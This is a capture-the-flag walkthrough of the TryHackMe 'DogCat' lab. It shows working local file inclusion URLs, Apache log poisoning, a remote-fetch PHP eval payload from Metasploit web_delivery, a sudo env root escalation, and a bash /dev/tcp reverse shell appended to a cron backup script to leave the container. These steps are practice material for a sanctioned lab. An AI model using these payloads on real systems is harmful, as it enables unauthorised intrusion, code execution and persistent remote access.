---
title: "DogCat TryHackMe Walkthrough"
source: "https://www.hackingarticles.in/dogcat-tryhackme-walkthrough/"
author:
  - "[[Raj]]"
published: 2021-03-31
created: 2025-12-08
description: "Today we’re going to solve another boot2root challenge called “DogCat “. It’s available at TryHackMe for penetration testing practice. This lab is of medium difficultly"
tags:
  - "clippings"
---
,

Today we’re going to solve another boot2root challenge called “DogCat “. It’s available at TryHackMe for penetration testing practice. This lab is of medium difficultly if we have the right basic knowledge to break the labs and are attentive to all the details we find during the reconnaissance. The credit for making this lab goes to **jammy**. Let’s get started and learn how to break it down successfully.

**Level**: Medium

### Penetration Testing Methodology

- **Network Scanning**
	- Nmap
- **Enumeration**
	- Browsing HTTP Service
	- Bypassing PHP Filter using Wrapper
	- Reading Back-End PHP Code
	- Bypassing Extension Filter
	- Detecting Local File Inclusion
- **Exploitation**
	- Exploiting Local File Inclusion
	- Reading Apache Access Logs
	- Poisoning Apache Logs
	- Upgrading LFI to RCE
	- Getting Meterpreter on the Target Machine
	- Reading Flag #1
	- Enumeration for Flags
	- Reading Flag #2
- **Privilege Escalation**
	- Enumerating Sudo Permissions
	- Exploiting Sudo Permissions on env
	- Getting Root Shell on Docker Instance
	- Reading Flag #3
	- Enumerating Writable Script
	- Getting Reverse Shell using Script
	- Reading Flag #4

### Walkthrough

To read and understand what the machine is, we will be starting with reading the Lab Description:

*“I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.”*

After Booting up the machine from the TryHackMe: DogCat Page, we will be provided with a Target IP Address.

**IP Address: 10.10.69.30**

This room has 4 flags that we need to find to complete the Machine.

### Network Scanning

We will start with a nmap scan with -sC for Default Scripts and -sV for Scanning Versions.

```
nmap -sC -sV 10.10.69.30
```

![](https://1.bp.blogspot.com/-CET9ehXZzUc/YGSOOzXp8QI/AAAAAAAAvLE/DtZg-HhBYzQge-DhmSwVCAQyDSnxT4QVwCLcBGAsYHQ/s16000/1.png)

The Nmap Scan gives us 2 services to enumerate. It gave us the SSH service on port 22 but unfortunately, we don’t have a set of credentials to access the machine via SSH. Next, we have the HTTP Service on port 80, which we will begin our enumeration with.

### Enumeration

As we have the HTTP Service Running, it is a good thing to check out the webpage that is hosted using a Web Browser. We are posed with a question. What we would like to see. Being a Dog Person, we chose Dog. It gave us such sweet pictures of Dogs that it almost made me miss the URL changes and the view parameter with dog value.

```
http://10.10.69.30/?view=dog
```

![](https://1.bp.blogspot.com/-kg_c11kKxt8/YGSOVdo43tI/AAAAAAAAvLI/_7fxB8uErA0w3rqUPhLdmodEotcIqqfWgCLcBGAsYHQ/s16000/2.png)

On mere instinct, it felt like this parameter might be injectable. Tried a bunch of different payloads. Then finally got to LFI. When we try to browse the etc/passwd file. It gives us an error that only dogs and cats are allowed as a value in the view parameter.

```
http://10.10.69.30/?view=../../../../../etc/passwd
```

![](https://1.bp.blogspot.com/-S9jtL9fdUuY/YGSOkuKzHxI/AAAAAAAAvLQ/x-qCOlrOq148A0URaHPzUyMWAh63rw9WQCLcBGAsYHQ/s16000/4.png)

This seemed like there is some restriction. To bypass this restriction, we tried to provide a php filter wrapper. It can be found in the [PayloadsAllTheThings GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion). Take the Filter and reconfigure it to run on our target machine.

![](https://1.bp.blogspot.com/-ZzhieYxpIQI/YGSOrBE5hwI/AAAAAAAAvLY/YF8bL78ZcnwGoJktgD_vGgzTPrc6T0r3wCLcBGAsYHQ/s16000/5.png)

When we tried to access the dog page through the wrapper, it returns a Base64 encoded string. Which when decoded returns the php code for that particular file.

```
<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />
```

That means that there are 10 pics of dogs on the server and the image fetched is at random.

```
http://10.10.69.30/?view=php://filter/convert.base64-encode/resource=dog
```

![](https://1.bp.blogspot.com/-OrcY6l-Cg70/YGSOvTwYUiI/AAAAAAAAvLc/VCunv8yyazAaX1_0IDUhMGQcXZJTMh5VwCLcBGAsYHQ/s16000/6.png)

Now that we can read the contents of dog.php, we can use the same technique to read the index.php or the main page. We are doing this to figure-read the code and understand how the index.php is working. Again, we are provided with a Base64 encoded string. It was getting quite big for normal display. Hence, switched to Source Code View.

![](https://1.bp.blogspot.com/-T7WYQ8vmW6c/YGSO1GUF8XI/AAAAAAAAvLg/Twk-rCZtmjQDaY2EXj6VYb4mVWOLQGFvQCLcBGAsYHQ/s16000/7.png)

Decoding to Clear Text, we can see the php code of the index.php page. Upon close inspection, we can see that the function adds a.php extension at the end of the URL so if we provide it with the ‘dog’ keyword it will convert it to dog.php and when we were giving it /etc/password it was converting it into /etc/passwd.php, Hence we need to escape this function to read files of our choice.

```
echo "###Base64 Encoded Text##" | base64 -d      
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
```

![](https://1.bp.blogspot.com/-4jHvDQHHspA/YGSO5aGaWsI/AAAAAAAAvLk/KBWKL0JRDNMQJzBWSu1i9jM7SUmto-VhACLcBGAsYHQ/s16000/8.png)

To escape the extension, we will add a parameter as shown in the image below. Now when we try to read the /etc/passwd file, it is directly accessible. We have successfully exploited the Local File Inclusion.

```
http://10.10.69.30/?view=dog/../../../../../../../etc/passwd&ext=
```

![](https://1.bp.blogspot.com/-9y4aq4Eu3iw/YGSPBp9E6wI/AAAAAAAAvLw/a9tA7sjj6GUK9w8N67NQheNu1hgG-vC4ACLcBGAsYHQ/s16000/10.png)

### Exploitation

We have the Local File Inclusion Vulnerability and from the nmap scan, we know that we are working with an Apache Server. Let’s try to convert this LFI Vulnerability into a Remote Code Execution if we can poison its logs. We have written an intensive Walkthrough of Apache Log Poisoning Through LFI. Here, we will breeze through it. If you want to learn more about it. Refer to the Link Below.

**[Apache Log Poisoning Through LFI](https://www.hackingarticles.in/apache-log-poisoning-through-lfi/)**

First, we will try to read the access.log file using LFI. The path for access.log is /var/log/apache2/access.log. We will replace our /etc/passwd with this location to read the log.

```
http://10.10.69.30/?view=dog/../../../../../../../var/log/apache2/access.log&ext=
```

![](https://1.bp.blogspot.com/-GFA6ENdp4gc/YGSPH_tL1CI/AAAAAAAAvL4/MUW_hwiBDewQdrSg7BLWtSl_l3n3j3EqwCLcBGAsYHQ/s16000/11.png)

Here, we can see that the log is accessible. Now it’s time to poison it. For this, we will be needing Burp Suite. We will capture the request using Burp Suite. Then we will manipulate the User-Agent. We can see that Default User-Agent in the image below.

![](https://1.bp.blogspot.com/-pAe0xgdY-vM/YGSPNExi4hI/AAAAAAAAvMA/7TMX1dNMIsEUUcIBGftsWX7rHeF8LjrJQCLcBGAsYHQ/s16000/12.png)

We change the User-Agent to introduce a php code that can call on system variables to run system commands. We forward the request to the server.

![](https://1.bp.blogspot.com/-Y-j9Z4yV_fY/YGSPRD1a8VI/AAAAAAAAvMI/pzSOeaNS62M3fRqFzt_BLjbSI51PZ0VRQCLcBGAsYHQ/s16000/13.png)

Now we will declare the c variable with system commands to check if it worked. We will run the whoami command. As we can observe that the response to our command was visible inside the logs. The command we gave the server was run using www-data user.

```
http://10.10.69.30/?view=dog/../../../../../../../var/log/apache2/access.log&ext=&c=whoami
```

![](https://1.bp.blogspot.com/-ef0sYZ4O_YU/YGSPVRDN1uI/AAAAAAAAvMM/N_TFywW6L_0OfXIs5vXeFLM5RFNvmvWlQCLcBGAsYHQ/s16000/14.png)

Now that we know that we can execute commands i.e., we have upgraded our Local File Inclusion Vulnerability to Remote Command Execution Vulnerability. Now we can use it to get a reverse shell on the target machine. For this, we will craft a php based payload using Metasploit Web Delivery Exploit. It requires basic details such as local IP Address (Make sure to give the IP Address from VPN), local port, srvport, etc.,

```
use exploit/multi/script/web_delivery
set target 1
set lhost 10.17.0.111
set srvport 8081
set payload php/meterpreter/reverse_tcp
exploit
```

![](https://1.bp.blogspot.com/-bT7qVJ7nqME/YGSQQkPnMlI/AAAAAAAAvMg/QhdLhouNC8AvITxvex0EJRf1g23U6E8sgCLcBGAsYHQ/s16000/15.png)

The Metasploit has crafted the payload as per our requirement. Now we have to copy the payload and replace the whoami command from the previous step with this payload. Please see the command depicted below.

```
http://10.10.69.30/?view=dog/../../../../../../../var/log/apache2/access.log&ext=&c=php -d allow_url_fopen=true -r "eval(file_get_contents('http://10.17.0.111:6666/BKroYb0O0eN', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
```

This would result in a reverse shell generated from the target machine to our local machine in the form of a meterpreter shell as shown in the image below.

![](https://1.bp.blogspot.com/-mX13EWqEyl0/YGSQWq2bTTI/AAAAAAAAvMk/fHwmrJmW0jwc484leMxaGbe8G-EHK_FNgCLcBGAsYHQ/s16000/16.png)

After getting to the meterpreter, we convert to the bash using the shell command. We find that to use the shell effectively we need to convert it into a TTY shell. So, we try python one-liner but the machine doesn’t have the python installed. Then we use the basic shell TTY command. After that, we run the whoami command to find that we have the shell as the www-data user. We list all the files in the current directory to find a flag.php file. Upon reading this file, we get our First Flag.

```
shell
/bin/sh -i
export TERM=xterm
whoami 
ls
cat flag.php
```

![](https://1.bp.blogspot.com/-Q6HjucObK3c/YGSQdJqRz-I/AAAAAAAAvMo/TNTMGKL9JxEqi6tjc8iWO-nk23m14m4NgCLcBGAsYHQ/s16000/17.png)

We move to the previous directory and listed its contents to find our Flag 2.

```
cd ..
cat flag2_QMW7JvaY2LvK.txt
```

![](https://1.bp.blogspot.com/-4c15crN2ZAo/YGSQgt3eUQI/AAAAAAAAvMw/XCaG8-iXwXMtzwctKl84LMF8PbsMFJtXQCLcBGAsYHQ/s16000/18.png)

### Privilege Escalation

We have 2 Flags and now there is nothing more to enumerate at this user level. This means now we will have to elevate our privileges to the root level. To do this we start our enumeration by reading the sudo permissions for the current user. This returned the env binary. That means the current user can run env binary as root user without any password for root.

```
sudo -l
(root) NOPASSWD: /usr/bin/env
```

![](https://1.bp.blogspot.com/-ZosZvHVkwpQ/YGSQk0RvrTI/AAAAAAAAvM0/1ZA8o3UrdvkMqf98iaFMFVOcys88QvQgQCLcBGAsYHQ/s16000/19.png)

Env is a part of GTFOBin, we know that because we solved a machine that had a similar privilege escalation method. Searching for env on [GTFOBin](https://gtfobins.github.io/gtfobins/env/) we find that all we need to do is execute the env command as sudo with /bin/sh as its parameter.

![](https://1.bp.blogspot.com/-unqOKx8bUn4/YGSQoxRdnMI/AAAAAAAAvM4/dNAKbASsS64ZO_cJc-PA008EIAjt2ng5gCLcBGAsYHQ/s16000/20.png)

Upon doing so, we get a root shell in no time. We try to look for the flag and find Flag 3 on the machine.

```
sudo env /bin/sh
whoami
cat flag3.txt
```

![](https://1.bp.blogspot.com/-KCPCBi6bDXY/YGSQs1MgDBI/AAAAAAAAvNA/kyYPUza--AMokoK-yQvXK7lPDJdYkHoaACLcBGAsYHQ/s16000/21.png)

If we remember the Machine Description from the Starting, we know that this is a docker instance running on the machine. The final flag must be accessible after getting out of this instance. We go to the root directory and list its contents. We can now confirm that this is indeed a docker instance. We start enumerating the usual locations and we stumbled upon a backups directory at the /opt location. The backups directory contained a compressed file and a shell script. Upon reading the shell script we can determine that it makes a backup on the running webpages into a compressed file. This script may be running periodically using a Cron Job.

```
cd /
ls -la
cd /opt
ls
cd backups
ls
cat backup.sh
```

![](https://1.bp.blogspot.com/-n7OjvKyNivg/YGSQwpPvb2I/AAAAAAAAvNI/InWwVHhIWsIV2veIBAjsNHhoZbB504d4ACLcBGAsYHQ/s16000/22.png)

We use the echo command to insert a shell invocation command pointing towards our local machine into the backup shell script. We can see that our shell invocation command is appended in the shell script in the image given below.

```
echo "/bin/bash -c 'bash -i >& /dev/tcp/10.17.0.111/1234 0>&1'" >> backup.sh
```

![](https://1.bp.blogspot.com/-gYXuVoI1PM8/YGSQ2tFfwKI/AAAAAAAAvNM/50LeY2Kdgqk7xtNoUdgaY9G9HBy7nS5_wCLcBGAsYHQ/s16000/23.png)

Now we start a listener at the port mentioned inside the shell invocation command so that it can receive the reverse shell generated. We see that the session we got is of root on the machine. We list the contents to find the Fourth and Final Flag on the Machine.

```
nc -lvp 1234
ls
cat flag4.txt
```

![](https://1.bp.blogspot.com/-nZqL-xu4qlo/YGSQ6h5R39I/AAAAAAAAvNQ/U7XpiaCtoB0bZ-2VKkPtw_S97cMt0drZgCLcBGAsYHQ/s16000/24.png)

This machine was quite interesting and We had quite fun while solving it.

Things that we learned, A quick recap.

Enumerating Parameters, Bypass PHP Filter using Wrapper, Reading the Back-End Code, Exploiting Local File Inclusion, Upgrading Local File Inclusion to Remote Code Execution, Getting Meterpreter, Elevating Privilege using Sudo permissions on env, Escaping the Docker Container using Writable Script.

**Author: Pavandeep Singh**  is a Technical Writer, Researcher, and Penetration Tester. Can be Contacted on  **Twitter** and **[LinkedIn](https://www.linkedin.com/in/pavan2318/)**